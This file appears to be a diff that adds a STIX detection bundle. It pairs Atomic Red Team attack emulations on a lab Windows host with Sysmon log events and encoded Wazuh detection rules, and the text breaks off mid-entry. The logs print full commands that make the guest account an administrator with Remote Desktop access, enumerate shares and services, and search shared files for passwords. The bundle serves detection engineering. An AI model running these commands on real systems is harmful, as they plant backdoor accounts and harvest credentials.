@@ -1,0 +1,1054 @@
+{
+    "type": "bundle",
+    "id": "bundle--56ddd80c-764f-4cda-9062-69ec07917c1d",
+    "objects": [
+        {
+            "type": "x-oca-behavior",
+            "spec_version": "2.1",
+            "id": "x-oca-behavior--b3067773-8b2b-4a01-a3e5-043e188131fd",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:08.052745Z",
+            "modified": "2025-07-16T11:25:08.052745Z",
+            "name": "Valid Accounts:Default Accounts",
+            "description": "Attacker executes Atomic Red Team test T1078.001 #1 to activate the default guest account on Windows host. This requires administrative privileges and enables the built-in guest account for subsequent lateral movement activities.",
+            "behavior_class": "anomalous",
+            "technique": "T1078.001",
+            "platforms": [
+                {
+                    "operating_system": "Microsoft Windows Operating System",
+                    "version": "10.0.19041.1 (WinBuild.160101.0800)"
+                }
+            ],
+            "extensions": {
+                "extension-definition--f37d7bd3-a9bd-4ee3-8767-c0038859f162": {
+                    "extension_type": "new-sdo"
+                }
+            },
+            "tactic": "TA0001"
+        },
+        {
+            "type": "x-oca-detection",
+            "spec_version": "2.1",
+            "id": "x-oca-detection--1fd1859b-5717-4d02-b2b6-54bf94e97e50",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:08.054037Z",
+            "modified": "2025-07-16T11:25:08.054037Z",
+            "name": "Wazuh Detection for Valid Accounts:Default Accounts",
+            "data_sources": [
+                {
+                    "LogName": "Microsoft-Windows-Sysmon/Operational",
+                    "WinEventData": {
+                        "commandLine": "net  user guest /active:yes",
+                        "company": "Microsoft Corporation",
+                        "currentDirectory": "C:\\\\Users\\\\windows-3\\\\AppData\\\\Local\\\\Temp\\\\",
+                        "description": "Net Command",
+                        "fileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
+                        "hashes": "SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07",
+                        "image": "C:\\\\Windows\\\\System32\\\\net.exe",
+                        "integrityLevel": "High",
+                        "logonGuid": "{3d676676-89df-6877-c0e1-140000000000}",
+                        "logonId": "0x14e1c0",
+                        "originalFileName": "net.exe",
+                        "parentCommandLine": "\\\"cmd.exe\\\" /c net user guest /active:yes &amp; net user guest Password123! &amp; net localgroup Administrators guest /add &amp; net localgroup \\\"Remote Desktop Users\\\" guest /add &amp; reg add \\\"hklm\\\\system\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f &amp; reg add \\\"hklm\\\\system\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v \\\"AllowTSConnections\\\" /t REG_DWORD /d 0x1 /f",
+                        "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                        "parentProcessGuid": "{3d676676-8c11-6877-8301-000000002700}",
+                        "parentProcessId": "400",
+                        "parentUser": "WIN-3\\\\windows-3",
+                        "processGuid": "{3d676676-8c11-6877-8501-000000002700}",
+                        "processId": "7120",
+                        "product": "Microsoft Windows Operating System",
+                        "ruleName": "technique_id=T1018,technique_name=Remote System Discovery",
+                        "terminalSessionId": "0",
+                        "user": "WIN-3\\\\windows-3",
+                        "utcTime": "2025-07-16 11:25:05.560"
+                    },
+                    "WinSystemData": {
+                        "channel": "Microsoft-Windows-Sysmon/Operational",
+                        "computer": "win-3.sri.local",
+                        "eventID": "1",
+                        "eventRecordID": "4824634",
+                        "keywords": "0x8000000000000000",
+                        "level": "4",
+                        "message": "\"Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2025-07-16 11:25:05.560\r\nProcessGuid: {3d676676-8c11-6877-8501-000000002700}\r\nProcessId: 7120\r\nImage: C:\\Windows\\System32\\net.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft Windows Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net.exe\r\nCommandLine: net  user guest /active:yes \r\nCurrentDirectory: C:\\Users\\windows-3\\AppData\\Local\\Temp\\\r\nUser: WIN-3\\windows-3\r\nLogonGuid: {3d676676-89df-6877-c0e1-140000000000}\r\nLogonId: 0x14E1C0\r\nTerminalSessionId: 0\r\nIntegrityLevel: High\r\nHashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07\r\nParentProcessGuid: {3d676676-8c11-6877-8301-000000002700}\r\nParentProcessId: 400\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c net user guest /active:yes & net user guest Password123! & net localgroup Administrators guest /add & net localgroup \"Remote Desktop Users\" guest /add & reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f\r\nParentUser: WIN-3\\windows-3\"",
+                        "opcode": "0",
+                        "processID": "3236",
+                        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                        "providerName": "Microsoft-Windows-Sysmon",
+                        "severityValue": "INFORMATION",
+                        "systemTime": "2025-07-16T11:25:05.5683743Z",
+                        "task": "1",
+                        "threadID": "4956",
+                        "version": "5"
+                    }
+                }
+            ],
+            "analytic": {
+                "rule": "WwogICgKICAgIHByb2Nlc3M6bmFtZSA9ICduZXQuZXhlJyBBTkQgCiAgICBwcm9jZXNzOmNvbW1hbmRfbGluZSBNQVRDSEVTICcoP2kpbmV0XFxzK3VzZXJcXHMrKGd1ZXN0fGFkbWluaXN0cmF0b3J8YWRtaW58cm9vdClcXHMrLiooL2FjdGl2ZTp5ZXN8L2FkZCknCiAgKSBPUiAoCiAgICBwcm9jZXNzOm5hbWUgPSAnbmV0LmV4ZScgQU5EIAogICAgcHJvY2Vzczpjb21tYW5kX2xpbmUgTUFUQ0hFUyAnKD9pKW5ldFxccytsb2NhbGdyb3VwXFxzKyhhZG1pbmlzdHJhdG9yc3wicmVtb3RlXFxzK2Rlc2t0b3BcXHMrdXNlcnMiKVxccysoZ3Vlc3R8YWRtaW5pc3RyYXRvcnxhZG1pbnxyb290KScKICApIE9SICgKICAgIHdpbmRvd3MtcmVnaXN0cnkta2V5OmtleSBMSUtFICdIS0VZX0xPQ0FMX01BQ0hJTkVcXHN5c3RlbVxcQ3VycmVudENvbnRyb2xTZXRcXENvbnRyb2xcXFRlcm1pbmFsIFNlcnZlcicgQU5ECiAgICAoCiAgICAgICh3aW5kb3dzLXJlZ2lzdHJ5LWtleTp2YWx1ZXMubmFtZSA9ICdmRGVueVRTQ29ubmVjdGlvbnMnIEFORCB3aW5kb3dzLXJlZ2lzdHJ5LWtleTp2YWx1ZXMuZGF0YSA9ICcwJykgT1IKICAgICAgKHdpbmRvd3MtcmVnaXN0cnkta2V5OnZhbHVlcy5uYW1lID0gJ0FsbG93VFNDb25uZWN0aW9ucycgQU5EIHdpbmRvd3MtcmVnaXN0cnkta2V5OnZhbHVlcy5kYXRhID0gJzEnKQogICAgKQogICkKXQ==",
+                "type": "Stix Pattern"
+            },
+            "extensions": {
+                "extension-definition--f0ae41ea-41ea-43f7-aac8-51cae0b65249": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f1ffa6a4-89bb-4495-b8b1-85da4ce0e983",
+            "created": "2025-07-16T11:25:08.054379Z",
+            "modified": "2025-07-16T11:25:08.054379Z",
+            "relationship_type": "detects",
+            "source_ref": "x-oca-behavior--b3067773-8b2b-4a01-a3e5-043e188131fd",
+            "target_ref": "x-oca-detection--1fd1859b-5717-4d02-b2b6-54bf94e97e50"
+        },
+        {
+            "type": "x-oca-behavior",
+            "spec_version": "2.1",
+            "id": "x-oca-behavior--a0db4b31-f163-4116-a5a7-b747fe116006",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:11.617936Z",
+            "modified": "2025-07-16T11:25:11.617936Z",
+            "name": "Network Share Discovery",
+            "description": "Attacker performs network share enumeration using Atomic Red Team test T1135 #5, executing PowerShell Get-SMBShare commands to identify available network shares accessible from the compromised Windows host.",
+            "behavior_class": "anomalous",
+            "technique": "T1135",
+            "platforms": [
+                {
+                    "operating_system": "Microsoft Windows Operating System",
+                    "version": "10.0.19041.3996 (WinBuild.160101.0800)"
+                }
+            ],
+            "extensions": {
+                "extension-definition--f37d7bd3-a9bd-4ee3-8767-c0038859f162": {
+                    "extension_type": "new-sdo"
+                }
+            },
+            "tactic": "TA0007"
+        },
+        {
+            "type": "x-oca-detection",
+            "spec_version": "2.1",
+            "id": "x-oca-detection--33ed0cfa-d653-4c88-bf91-8d0ccafff57e",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:11.619008Z",
+            "modified": "2025-07-16T11:25:11.619008Z",
+            "name": "Wazuh Detection for Network Share Discovery",
+            "data_sources": [
+                {
+                    "LogName": "Microsoft-Windows-Sysmon/Operational",
+                    "WinEventData": {
+                        "commandLine": "\\\"powershell.exe\\\" &amp; {get-smbshare}",
+                        "company": "Microsoft Corporation",
+                        "currentDirectory": "C:\\\\Users\\\\windows-3\\\\AppData\\\\Local\\\\Temp\\\\",
+                        "description": "Windows PowerShell",
+                        "fileVersion": "10.0.19041.3996 (WinBuild.160101.0800)",
+                        "hashes": "SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",
+                        "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                        "integrityLevel": "High",
+                        "logonGuid": "{3d676676-89df-6877-c0e1-140000000000}",
+                        "logonId": "0x14e1c0",
+                        "originalFileName": "PowerShell.EXE",
+                        "parentCommandLine": "\\\"C:\\\\progra~1\\\\powershell\\\\7\\\\pwsh.exe\\\" -sshs",
+                        "parentImage": "C:\\\\PROGRA~1\\\\PowerShell\\\\7\\\\pwsh.exe",
+                        "parentProcessGuid": "{3d676676-89e6-6877-3001-000000002700}",
+                        "parentProcessId": "4156",
+                        "parentUser": "WIN-3\\\\windows-3",
+                        "processGuid": "{3d676676-8c12-6877-9101-000000002700}",
+                        "processId": "2188",
+                        "product": "Microsoft Windows Operating System",
+                        "ruleName": "technique_id=T1059.001,technique_name=PowerShell",
+                        "terminalSessionId": "0",
+                        "user": "WIN-3\\\\windows-3",
+                        "utcTime": "2025-07-16 11:25:06.397"
+                    },
+                    "WinSystemData": {
+                        "channel": "Microsoft-Windows-Sysmon/Operational",
+                        "computer": "win-3.sri.local",
+                        "eventID": "1",
+                        "eventRecordID": "4824648",
+                        "keywords": "0x8000000000000000",
+                        "level": "4",
+                        "message": "\"Process Create:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-07-16 11:25:06.397\r\nProcessGuid: {3d676676-8c12-6877-9101-000000002700}\r\nProcessId: 2188\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft Windows Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {get-smbshare}\r\nCurrentDirectory: C:\\Users\\windows-3\\AppData\\Local\\Temp\\\r\nUser: WIN-3\\windows-3\r\nLogonGuid: {3d676676-89df-6877-c0e1-140000000000}\r\nLogonId: 0x14E1C0\r\nTerminalSessionId: 0\r\nIntegrityLevel: High\r\nHashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\r\nParentProcessGuid: {3d676676-89e6-6877-3001-000000002700}\r\nParentProcessId: 4156\r\nParentImage: C:\\PROGRA~1\\PowerShell\\7\\pwsh.exe\r\nParentCommandLine: \"C:\\progra~1\\powershell\\7\\pwsh.exe\" -sshs\r\nParentUser: WIN-3\\windows-3\"",
+                        "opcode": "0",
+                        "processID": "3236",
+                        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                        "providerName": "Microsoft-Windows-Sysmon",
+                        "severityValue": "INFORMATION",
+                        "systemTime": "2025-07-16T11:25:06.4092315Z",
+                        "task": "1",
+                        "threadID": "4956",
+                        "version": "5"
+                    }
+                }
+            ],
+            "analytic": {
+                "rule": "WwogIHByb2Nlc3M6bmFtZSA9ICdwb3dlcnNoZWxsLmV4ZScgQU5EICgKICAgIHByb2Nlc3M6Y29tbWFuZF9saW5lIE1BVENIRVMgJyg/aSlnZXQtc21ic2hhcmUnIAogICkKXQ==",
+                "type": "Stix Pattern"
+            },
+            "extensions": {
+                "extension-definition--f0ae41ea-41ea-43f7-aac8-51cae0b65249": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--29a3ddbe-2bc9-4f77-bfdb-dd17a5657237",
+            "created": "2025-07-16T11:25:11.619806Z",
+            "modified": "2025-07-16T11:25:11.619806Z",
+            "relationship_type": "detects",
+            "source_ref": "x-oca-behavior--a0db4b31-f163-4116-a5a7-b747fe116006",
+            "target_ref": "x-oca-detection--33ed0cfa-d653-4c88-bf91-8d0ccafff57e"
+        },
+        {
+            "type": "x-oca-behavior",
+            "spec_version": "2.1",
+            "id": "x-oca-behavior--b2ea2e3c-f80c-4f1d-9982-9ddc77b038e1",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:12.510786Z",
+            "modified": "2025-07-16T11:25:12.510786Z",
+            "name": "Network Service Discovery",
+            "description": "Attacker conducts service discovery using Atomic Red Team test T1046 #11, specifically targeting Remote Desktop Services through PowerShell Get-Service commands to identify potential remote access vectors.",
+            "behavior_class": "anomalous",
+            "technique": "T1046",
+            "platforms": [
+                {
+                    "operating_system": "Microsoft Windows Operating System",
+                    "version": "10.0.19041.3996 (WinBuild.160101.0800)"
+                }
+            ],
+            "extensions": {
+                "extension-definition--f37d7bd3-a9bd-4ee3-8767-c0038859f162": {
+                    "extension_type": "new-sdo"
+                }
+            },
+            "tactic": "TA0007"
+        },
+        {
+            "type": "x-oca-detection",
+            "spec_version": "2.1",
+            "id": "x-oca-detection--23e82013-0494-4cf5-977f-02822938048a",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:12.511855Z",
+            "modified": "2025-07-16T11:25:12.511855Z",
+            "name": "Wazuh Detection for Network Service Discovery",
+            "data_sources": [
+                {
+                    "LogName": "Microsoft-Windows-Sysmon/Operational",
+                    "WinEventData": {
+                        "commandLine": "\\\"powershell.exe\\\" &amp; {Get-Service -Name \\\\\\\"\\\"Remote Desktop Services\\\\\\\"\\\", \\\\\\\"\\\"Remote Desktop Configuration\\\\\\\"\\\"}",
+                        "company": "Microsoft Corporation",
+                        "currentDirectory": "C:\\\\Users\\\\windows-3\\\\AppData\\\\Local\\\\Temp\\\\",
+                        "description": "Windows PowerShell",
+                        "fileVersion": "10.0.19041.3996 (WinBuild.160101.0800)",
+                        "hashes": "SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",
+                        "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                        "integrityLevel": "High",
+                        "logonGuid": "{3d676676-89df-6877-c0e1-140000000000}",
+                        "logonId": "0x14e1c0",
+                        "originalFileName": "PowerShell.EXE",
+                        "parentCommandLine": "\\\"C:\\\\progra~1\\\\powershell\\\\7\\\\pwsh.exe\\\" -sshs",
+                        "parentImage": "C:\\\\PROGRA~1\\\\PowerShell\\\\7\\\\pwsh.exe",
+                        "parentProcessGuid": "{3d676676-89e6-6877-3001-000000002700}",
+                        "parentProcessId": "4156",
+                        "parentUser": "WIN-3\\\\windows-3",
+                        "processGuid": "{3d676676-8c16-6877-9601-000000002700}",
+                        "processId": "5928",
+                        "product": "Microsoft Windows Operating System",
+                        "ruleName": "technique_id=T1059.001,technique_name=PowerShell",
+                        "terminalSessionId": "0",
+                        "user": "WIN-3\\\\windows-3",
+                        "utcTime": "2025-07-16 11:25:10.597"
+                    },
+                    "WinSystemData": {
+                        "channel": "Microsoft-Windows-Sysmon/Operational",
+                        "computer": "win-3.sri.local",
+                        "eventID": "1",
+                        "eventRecordID": "4824670",
+                        "keywords": "0x8000000000000000",
+                        "level": "4",
+                        "message": "\"Process Create:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-07-16 11:25:10.597\r\nProcessGuid: {3d676676-8c16-6877-9601-000000002700}\r\nProcessId: 5928\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft Windows Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {Get-Service -Name \\\"\"Remote Desktop Services\\\"\", \\\"\"Remote Desktop Configuration\\\"\"}\r\nCurrentDirectory: C:\\Users\\windows-3\\AppData\\Local\\Temp\\\r\nUser: WIN-3\\windows-3\r\nLogonGuid: {3d676676-89df-6877-c0e1-140000000000}\r\nLogonId: 0x14E1C0\r\nTerminalSessionId: 0\r\nIntegrityLevel: High\r\nHashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\r\nParentProcessGuid: {3d676676-89e6-6877-3001-000000002700}\r\nParentProcessId: 4156\r\nParentImage: C:\\PROGRA~1\\PowerShell\\7\\pwsh.exe\r\nParentCommandLine: \"C:\\progra~1\\powershell\\7\\pwsh.exe\" -sshs\r\nParentUser: WIN-3\\windows-3\"",
+                        "opcode": "0",
+                        "processID": "3236",
+                        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                        "providerName": "Microsoft-Windows-Sysmon",
+                        "severityValue": "INFORMATION",
+                        "systemTime": "2025-07-16T11:25:10.6014720Z",
+                        "task": "1",
+                        "threadID": "4956",
+                        "version": "5"
+                    }
+                }
+            ],
+            "analytic": {
+                "rule": "WwogIHByb2Nlc3M6bmFtZSA9ICdwb3dlcnNoZWxsLmV4ZScgQU5EIAogIHByb2Nlc3M6Y29tbWFuZF9saW5lIE1BVENIRVMgJyg/aSlHZXQtU2VydmljZVxccysoLU5hbWUpP1xccyouKlJlbW90ZVxccytEZXNrdG9wXFxzK1NlcnZpY2VzLio/Jwpd",
+                "type": "Stix Pattern"
+            },
+            "extensions": {
+                "extension-definition--f0ae41ea-41ea-43f7-aac8-51cae0b65249": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--31faf21d-9f2d-4977-84fd-3d07a6a21c67",
+            "created": "2025-07-16T11:25:12.512592Z",
+            "modified": "2025-07-16T11:25:12.512592Z",
+            "relationship_type": "detects",
+            "source_ref": "x-oca-behavior--b2ea2e3c-f80c-4f1d-9982-9ddc77b038e1",
+            "target_ref": "x-oca-detection--23e82013-0494-4cf5-977f-02822938048a"
+        },
+        {
+            "type": "x-oca-behavior",
+            "spec_version": "2.1",
+            "id": "x-oca-behavior--a21d1114-4662-427a-9e01-ebde118840a9",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:13.431148Z",
+            "modified": "2025-07-16T11:25:13.431148Z",
+            "name": "File and Directory Discovery",
+            "description": "Attacker performs recursive file and directory enumeration on discovered network shares using Atomic Red Team test T1083 #2.",
+            "behavior_class": "anomalous",
+            "technique": "T1083",
+            "platforms": [
+                {
+                    "operating_system": "Microsoft Windows Operating System",
+                    "version": "10.0.19041.3996 (WinBuild.160101.0800)"
+                }
+            ],
+            "extensions": {
+                "extension-definition--f37d7bd3-a9bd-4ee3-8767-c0038859f162": {
+                    "extension_type": "new-sdo"
+                }
+            },
+            "tactic": "TA0007"
+        },
+        {
+            "type": "x-oca-detection",
+            "spec_version": "2.1",
+            "id": "x-oca-detection--58c886ee-b6d3-4850-9858-b2045dfa7ce1",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:13.432305Z",
+            "modified": "2025-07-16T11:25:13.432305Z",
+            "name": "Wazuh Detection for File and Directory Discovery",
+            "data_sources": [
+                {
+                    "LogName": "Microsoft-Windows-Sysmon/Operational",
+                    "WinEventData": {
+                        "commandLine": "\\\"powershell.exe\\\" &amp; {ls -recurse -Path \\\\\\\"\\\"C:\\\\Users\\\\windows-3\\\\Documents\\\\SharedFolder\\\\\\\"\\\" get-childitem -recurse  gci -recurse}",
+                        "company": "Microsoft Corporation",
+                        "currentDirectory": "C:\\\\Users\\\\windows-3\\\\AppData\\\\Local\\\\Temp\\\\",
+                        "description": "Windows PowerShell",
+                        "fileVersion": "10.0.19041.3996 (WinBuild.160101.0800)",
+                        "hashes": "SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",
+                        "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                        "integrityLevel": "High",
+                        "logonGuid": "{3d676676-89df-6877-c0e1-140000000000}",
+                        "logonId": "0x14e1c0",
+                        "originalFileName": "PowerShell.EXE",
+                        "parentCommandLine": "\\\"C:\\\\progra~1\\\\powershell\\\\7\\\\pwsh.exe\\\" -sshs",
+                        "parentImage": "C:\\\\PROGRA~1\\\\PowerShell\\\\7\\\\pwsh.exe",
+                        "parentProcessGuid": "{3d676676-89e6-6877-3001-000000002700}",
+                        "parentProcessId": "4156",
+                        "parentUser": "WIN-3\\\\windows-3",
+                        "processGuid": "{3d676676-8c17-6877-9c01-000000002700}",
+                        "processId": "3184",
+                        "product": "Microsoft Windows Operating System",
+                        "ruleName": "technique_id=T1083,technique_name=File and Directory Discovery",
+                        "terminalSessionId": "0",
+                        "user": "WIN-3\\\\windows-3",
+                        "utcTime": "2025-07-16 11:25:11.536"
+                    },
+                    "WinSystemData": {
+                        "channel": "Microsoft-Windows-Sysmon/Operational",
+                        "computer": "win-3.sri.local",
+                        "eventID": "1",
+                        "eventRecordID": "4824687",
+                        "keywords": "0x8000000000000000",
+                        "level": "4",
+                        "message": "\"Process Create:\r\nRuleName: technique_id=T1083,technique_name=File and Directory Discovery\r\nUtcTime: 2025-07-16 11:25:11.536\r\nProcessGuid: {3d676676-8c17-6877-9c01-000000002700}\r\nProcessId: 3184\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft Windows Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {ls -recurse -Path \\\"\"C:\\Users\\windows-3\\Documents\\SharedFolder\\\"\"\nget-childitem -recurse \ngci -recurse}\r\nCurrentDirectory: C:\\Users\\windows-3\\AppData\\Local\\Temp\\\r\nUser: WIN-3\\windows-3\r\nLogonGuid: {3d676676-89df-6877-c0e1-140000000000}\r\nLogonId: 0x14E1C0\r\nTerminalSessionId: 0\r\nIntegrityLevel: High\r\nHashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\r\nParentProcessGuid: {3d676676-89e6-6877-3001-000000002700}\r\nParentProcessId: 4156\r\nParentImage: C:\\PROGRA~1\\PowerShell\\7\\pwsh.exe\r\nParentCommandLine: \"C:\\progra~1\\powershell\\7\\pwsh.exe\" -sshs\r\nParentUser: WIN-3\\windows-3\"",
+                        "opcode": "0",
+                        "processID": "3236",
+                        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                        "providerName": "Microsoft-Windows-Sysmon",
+                        "severityValue": "INFORMATION",
+                        "systemTime": "2025-07-16T11:25:11.5405578Z",
+                        "task": "1",
+                        "threadID": "4956",
+                        "version": "5"
+                    }
+                }
+            ],
+            "analytic": {
+                "rule": "WwogIHByb2Nlc3M6bmFtZSA9ICdwb3dlcnNoZWxsLmV4ZScgQU5EICgKICAgIHByb2Nlc3M6Y29tbWFuZF9saW5lIE1BVENIRVMgJyg/aSlsc1xccystcmVjdXJzZScgT1IKICAgIHByb2Nlc3M6Y29tbWFuZF9saW5lIE1BVENIRVMgJyg/aSlnZXQtY2hpbGRpdGVtXFxzKy1yZWN1cnNlJyBPUgogICAgcHJvY2Vzczpjb21tYW5kX2xpbmUgTUFUQ0hFUyAnKD9pKWdjaVxccystcmVjdXJzZScKICApCl0=",
+                "type": "Stix Pattern"
+            },
+            "extensions": {
+                "extension-definition--f0ae41ea-41ea-43f7-aac8-51cae0b65249": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--6dbc4ee0-a00d-456f-b415-b11781b641d0",
+            "created": "2025-07-16T11:25:13.433267Z",
+            "modified": "2025-07-16T11:25:13.433267Z",
+            "relationship_type": "detects",
+            "source_ref": "x-oca-behavior--a21d1114-4662-427a-9e01-ebde118840a9",
+            "target_ref": "x-oca-detection--58c886ee-b6d3-4850-9858-b2045dfa7ce1"
+        },
+        {
+            "type": "x-oca-behavior",
+            "spec_version": "2.1",
+            "id": "x-oca-behavior--41f7db38-a41c-4f0f-9bb6-7122072e4de5",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:14.330Z",
+            "modified": "2025-07-16T11:25:14.330Z",
+            "name": "Unsecured Credentials: Credential in Files",
+            "description": "Attacker searches for credentials in files using Atomic Red Team test T1552.001 #4, employing PowerShell findstr commands to locate password information in 'notapasswordfile.txt' on the network share, ultimately obtaining another Windows host's credentials.",
+            "behavior_class": "anomalous",
+            "technique": "T1552.001",
+            "platforms": [
+                {
+                    "operating_system": "Microsoft Windows Operating System",
+                    "version": "10.0.19041.3996 (WinBuild.160101.0800)"
+                }
+            ],
+            "extensions": {
+                "extension-definition--f37d7bd3-a9bd-4ee3-8767-c0038859f162": {
+                    "extension_type": "new-sdo"
+                }
+            },
+            "tactic": "TA0006"
+        },
+        {
+            "type": "x-oca-detection",
+            "spec_version": "2.1",
+            "id": "x-oca-detection--41e768a5-805f-4222-9eb8-897ef1d65cfb",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:14.330996Z",
+            "modified": "2025-07-16T11:25:14.330996Z",
+            "name": "Wazuh Detection for Unsecured Credentials: Credential in Files",
+            "data_sources": [
+                {
+                    "LogName": "Microsoft-Windows-Sysmon/Operational",
+                    "WinEventData": {
+                        "commandLine": "\\\"powershell.exe\\\" &amp; {cd C:\\\\Users\\\\windows-3\\\\Documents\\\\SharedFolder findstr /si pass *.xml *.doc *.txt *.xls ls -R | select-string -ErrorAction SilentlyContinue -Pattern username}",
+                        "company": "Microsoft Corporation",
+                        "currentDirectory": "C:\\\\Users\\\\windows-3\\\\AppData\\\\Local\\\\Temp\\\\",
+                        "description": "Windows PowerShell",
+                        "fileVersion": "10.0.19041.3996 (WinBuild.160101.0800)",
+                        "hashes": "SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",
+                        "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                        "integrityLevel": "High",
+                        "logonGuid": "{3d676676-89df-6877-c0e1-140000000000}",
+                        "logonId": "0x14e1c0",
+                        "originalFileName": "PowerShell.EXE",
+                        "parentCommandLine": "\\\"C:\\\\progra~1\\\\powershell\\\\7\\\\pwsh.exe\\\" -sshs",
